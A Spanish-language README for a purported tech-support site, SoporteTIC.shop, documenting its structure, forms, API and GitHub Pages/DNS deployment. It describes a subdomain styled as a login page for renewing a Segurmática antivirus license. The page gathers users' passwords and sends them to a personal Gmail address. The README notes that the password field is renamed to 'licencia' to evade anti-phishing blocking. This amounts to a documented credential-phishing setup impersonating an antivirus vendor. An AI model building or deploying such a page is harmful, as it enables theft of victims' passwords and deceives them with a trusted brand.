# SoporteTIC.shop

Sitio web de soporte técnico especializado en ciberseguridad, software y hardware.

## Estructura

```
soportetic/
├── index.html          # Landing page (con secciones: hero, servicios, antivirus, contacto)
├── css/
│   └── styles.css      # Estilos (tema dark cyber)
├── js/
│   └── main.js         # Lógica frontend (formularios, navbar, animaciones)
├── server/
│   ├── server.js       # Servidor Express
│   └── database.js     # Configuración SQLite
├── package.json
├── README.md
├── segurmatica.png     # Logo Segurmática
├── segurmatica2.jpeg   # Logo Segurmática (variante)
└── actualizacion.html # Página de actualización (copia local, deploy en subdominio)
```

## Secciones del sitio

| Sección | ID | Descripción |
|---------|----|-------------|
| Hero | `#hero` | Presentación principal con estadísticas |
| Servicios | `#services` | Soporte técnico, ciberseguridad, software, hardware |
| Antivirus | `#antivirus` | Alianza con Segurmática + formulario de consulta |
| Contacto | `#contacto` | Formulario de soporte general |

## Formularios

Todos los formularios envían datos a servicios externos:

| Formulario | Servicio | Endpoint | Email destino |
|------------|----------|----------|---------------|
| Soporte (`supportForm`) | Formspree | `https://formspree.io/f/mdeazzzo` | tanketoanonimo@gmail.com |
| Antivirus (`antivirusForm`) | Formspree | `https://formspree.io/f/mdeazzzo` | tanketoanonimo@gmail.com |
| Actualización (`updateForm`) | Web3Forms | `https://api.web3forms.com/submit` | cercador1001999@gmail.com |

### Notas sobre formularios
- El formulario de **actualización** está en el subdominio `actualizacion.soportetic.shop` (repo separado: `actualizacion-soportetic`)
- El campo de contraseña se renombra internamente a `licencia` antes de enviar a Web3Forms para evitar bloqueos anti-phishing
- Cada formulario genera un ticket automático con prefijo (`TIC-`, `AV-`)

## Subdominio: actualizacion.soportetic.shop

Página de actualización de licencia de Segurmática Antivirus con estilo login.

- **Repositorio**: `https://github.com/cercador1001999-code/actualizacion-soportetic`
- **Hosting**: GitHub Pages (rama `main`, carpeta raíz)
- **Dominio**: `actualizacion.soportetic.shop` (CNAME → `cercador1001999-code.github.io`)
- **DNS**: CNAME configurado en Hostinger
- **Estilo**: Tema dark cyber igual a soportetic.shop, con branding de Segurmática (rojo)
- **Formulario**: Web3Forms con campos: nombre, apellido, email, contraseña, tipo de consulta, producto

## Botón "Actualice"

En la sección antivirus de `soportetic.shop` hay un botón **"Actualice"** que enlaza a `https://actualizacion.soportetic.shop`.

## Instalación

```bash
cd "d:\Tools\Autcer automatizado\paginas web\soportetic"
npm install
npm start
```

El servidor corre en `http://localhost:3000`.

## API Endpoints

| Método | Ruta | Descripción |
|--------|------|-------------|
| POST | `/api/tickets` | Crear ticket de soporte |
| GET | `/api/tickets` | Listar todos los tickets |
| GET | `/api/tickets/:id` | Obtener ticket por ID |
| PATCH | `/api/tickets/:id/status` | Actualizar estado del ticket |
| POST | `/api/contact` | Formulario de contacto |

## Deploy

### soportetic.shop
- **Hosting**: GitHub Pages (repo `SoporteTiC`)
- **Dominio**: `soportetic.shop` (CNAME → `cercador1001999-code.github.io`)
- **DNS**: Hostinger

### actualizacion.soportetic.shop
- **Hosting**: GitHub Pages (repo `actualizacion-soportetic`)
- **Dominio**: `actualizacion.soportetic.shop` (CNAME → `cercador1001999-code.github.io`)
- **DNS**: CNAME `actualizacion` → `cercador1001999-code.github.io` en Hostinger

### Nameservers configurados
- `byte.dns-parking.com`
- `pixel.dns-parking.com`

## Base de datos

Usa SQLite (archivo `database/soportetic.db`) que se crea automáticamente al primer arranque.

Tablas:
- **tickets**: Tickets de soporte (id, ticket_id, name, email, phone, service, priority, message, status, timestamps)
- **contacts**: Mensajes de contacto (id, name, email, message, timestamp)
